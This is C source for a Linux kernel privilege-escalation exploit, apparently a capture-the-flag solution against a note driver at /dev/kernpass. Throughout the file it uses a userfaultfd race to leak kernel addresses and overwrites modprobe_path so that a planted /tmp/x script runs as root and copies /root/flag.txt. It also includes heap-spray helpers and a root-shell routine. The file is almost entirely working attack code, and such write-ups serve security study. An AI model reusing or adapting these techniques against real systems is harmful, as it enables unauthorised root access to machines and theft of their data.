#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>
#include <stdarg.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/shm.h>

#include "userfaultfd.h"

#define DEV_PATH "/dev/kernpass"   // the path the device is placed

#define ulong unsigned long
#define PAGE_SZ 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define ARRAY_SIZE(a) (sizeof((a)) / sizeof((a)[0]))
#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }
#define MAX_KEYS 199

typedef struct {
    int read;
    int write;
} pipe_t;

int seq_ops[0x10000];
int ptmx[0x1000];
int keys[0x1000];
pthread_t poll_tid[0x1000];
int pipes[0x1000][0x02];
int fds[0x1000];
int n_keys;

struct poll_list {
	struct poll_list *next;
	int len;
	struct pollfd entries[];
};

struct rcu_head {
    void *next;
    void *func;
};

struct user_key_payload {
    struct rcu_head rcu;
    unsigned short datalen;
    char *data[];
};

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'cp /root/flag.txt / && /bin/chmod 0666 /flag.txt' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int randint(int min, int max)
{
    return min + (rand() % (max - min));
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
        setuid(0);
        char *args[] = { "/bin/sh", "-i", NULL };
        execve(args[0], args, NULL);
	}
	exit(0);
}

static int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

static bool is_kernel_ptr(uint64_t val)
{
    return (val & KERNEL_MASK) == KERNEL_MASK
        && val != 0xffffffffffffffff;
}

static bool is_heap_ptr(uint64_t val)
{
    return (val & HEAP_MASK) == HEAP_MASK
        && val != 0xffffffffffffffff;
}

void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] sched_setaffinity()");
    }
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] assign_thread_to_core_range()");
    }
}

void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        errExit("[X] init_fd()");
    }
}

static void alloc_seq_ops(int i) {
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0) {
        errExit("[X] spray_seq_ops()");
    }
}

static void free_seq_ops(int i) {
    if (close(seq_ops[i]) < 0) {
        errExit("[X] free seq_ops");
    }
}

static void alloc_tty(int i) {
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0) {
        errExit("[X] alloc_tty");
    }
}

static void free_tty(int i) {
    if (close(ptmx[i]) < 0) {
        errExit("[X] free tty");
    }
}

void alloc_pipe_buf(int i)
{
    if (pipe(pipes[i]) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    if (write(pipes[i][1], "XXXXX", 5) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }
}

void release_pipe_buf(int i)
{
    if (close(pipes[i][0]) < 0) {
        errExit("[X] release_pipe_buf");
    }

    if (close(pipes[i][1]) < 0) {
        errExit("[X] release_pipe_buf");
    }
}

typedef struct {
    int fd_read;
    unsigned amt;
    unsigned timeout;
    bool suspend;
} thread_args_t;

static unsigned corrupted_key;
#define POLL_LIST_SZ 0x10
#define POLL_FD_SZ 0x8
#define MAX_POLL_LIST_FDS 510
#define POLLFD_PER_PAGE  ((PAGE_SZ-sizeof(struct poll_list)) / sizeof(struct pollfd))
#define STACK_PPS_SZ 0x100

/*
 * Calc amount of fds we need to alloc to trigger allocation of a specific
 * kmalloc chunk
 */
static unsigned fds_to_alloc(size_t sz)
{
    // stuff allocated on stack (inside stack_pps buf)
    unsigned to_alloc = (STACK_PPS_SZ - sizeof(struct poll_list)) / sizeof(struct pollfd);

    // subtract size needed for poll_list struct
    if (sz % PAGE_SZ == 0) {
        sz -= sz / PAGE_SZ * sizeof(struct poll_list);
    }
    else {
        sz -= (sz / PAGE_SZ + 1) * sizeof(struct poll_list);
    }

    to_alloc += sz / sizeof(struct pollfd);

    return to_alloc;
}

static int poll_threads;
static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;

/*
 * Note: In the exploit I use the assign_to_core() function to assign the
 * process to another core before creating poll threads. This is useful to
 * reduce noise due to thread creation on core 0 slabs. Once a thread has
 * been created, it is assigned back to core-0 right before the poll()
 * call using assign_thread_to_core(), a pthread_attr_setaffinity_np() wrapper.
 */
static void* spray_poll_list(void* args)
{
    thread_args_t *ta = (thread_args_t *)args;
    int ret;

    struct pollfd *pollers = calloc(ta->amt, sizeof(struct pollfd));

    for (int i = 0; i < ta->amt; i++) {
        pollers[i].fd = ta->fd_read;
        pollers[i].events = POLLERR;
    }

    assign_thread_to_core(0x0);

    pthread_mutex_lock(&poll_mutex);
    poll_threads++;
    pthread_mutex_unlock(&poll_mutex);

    ret = poll(pollers, ta->amt, ta->timeout);
    if (ret < 0) {
        errExit("poll");
    }

    assign_thread_to_core(randint(0x1, 0x3));

    if (ta->suspend) {
        pthread_mutex_lock(&poll_mutex);
        poll_threads--;
        pthread_mutex_unlock(&poll_mutex);

        while (1) { };
    }

    return NULL;
}

static void create_poll_thread(int i, thread_args_t *args)
{
    int ret;

    ret = pthread_create(&poll_tid[i], 0, spray_poll_list, (void *)args);
    if (ret != 0) {
        errExit("pthread_create");
    }
}

static void join_poll_threads(void)
{
    int ret;
    for (int i = 0; i < poll_threads; i++) {
        ret = pthread_join(poll_tid[i], NULL);

        if (ret < 0) {
            errExit("pthread_join");
        }
        open("/proc/self/stat", O_RDONLY);
    }
    poll_threads = 0x0;
}

#define NOTE_ADD 0x13370001
#define NOTE_VIEW 0x13370002
#define NOTE_EDIT 0x13370003
#define NOTE_DEL 0x13370004

typedef struct  {
    uint32_t index;
    uint32_t size;
    char* buf;
} req_t ;

// max size = 0x200
static void add_note(int fd, int idx, char* buf, uint32_t sz)
{
    req_t req = {
        .index = idx,
        .size = sz,
        .buf =buf
    };

    if (ioctl(fd, NOTE_ADD, &req) < 0) {
        errExit("ioctl");
    }
}

static void view_note(int fd, int idx, char* buf) {
    req_t req = {
        .index = idx,
        .size = 0,
        .buf =buf
    };
    if (ioctl(fd, NOTE_VIEW, &req) < 0) {
        errExit("ioctl");
    }
}

static void edit_note(int fd, int idx, char*buf, uint32_t sz) {
    req_t req = {
        .index = idx,
        .size = sz,
        .buf =buf
    };
    if (ioctl(fd, NOTE_EDIT, &req) < 0) {
        errExit("ioctl");
    }
}

static void del_note(int fd, int idx) {
    req_t req = {
        .index = idx,
        .size = 0,
        .buf =0
    };
    if (ioctl(fd, NOTE_DEL, &req) < 0) {
        errExit("ioctl");
    }
}

static int fd;
static void get_leak(void)
{
    info("Get leak func called \n");
    del_note(fd, 0);

    shmget(IPC_PRIVATE, 4096, IPC_CREAT | IPC_EXCL | 0666);
}

static void corrupt_entry(void)
{
    info("Corrupt entry called \n");
    del_note(fd, 0x0);

    char buf[0x40];
    // management chunk = prev management chunk
    add_note(fd, 0x1, buf, 0x40);
    // management chunk = idx 0 data chunk
    add_note(fd, 0x2, buf, 0x40);
}

int main(int argc, char** argv)
{
    fd = open(DEV_PATH, O_RDONLY);

    if (fd < 0) {
        errExit("open");
    }

    assign_to_core(0);

    char buf[0x1000] = {};
    uint64_t* p_buf = (uint64_t*)buf;

    uint64_t *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (page == MAP_FAILED){
        errExit("mmap");
    }

    add_note(fd, 0x0, buf, 0x100);

    register_uffd(page, 0x1000, buf, get_leak);

    view_note(fd, 0x0, page);

    uint64_t physmap = page[26] & 0xfffffffff0000000;
    uint64_t kbase = page[28] - 0x1c6dd60;
    uint64_t task_struct_leak = page[25];
    uint64_t modprobe_path = kbase + 0x1a8be80;
    uint64_t core_pattern = kbase + 0x1c4c7c0;

    info("Kbase: %p \n", kbase);
    info("heap leak: %p \n", task_struct_leak);
    info("modprobe path: %p \n", modprobe_path);
    info("core pattern: %p \n", core_pattern);

    page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (page == MAP_FAILED){
        errExit("mmap");
    }

    add_note(fd, 0x0, buf, 0x10);

    p_buf[0] = 0x40;
    p_buf[1] = modprobe_path;

    register_uffd(page, 0x1000, buf, corrupt_entry);

    edit_note(fd, 0x0, page, 0x10);

    view_note(fd, 0x2, buf);

    strcpy(buf, "/tmp/x");

    edit_note(fd, 0x2, buf, 0x10);
    //WAIT();

    shell_modprobe();

    system("cat /flag.txt");

    puts("All done");
    WAIT();
}

// 0x204 => kmalloc 1024

// mov\s+(.*),\s*rax ; (:*)ret
// mov qword ptr [rsp\s+(.*),\s*rax ; (:*)ret
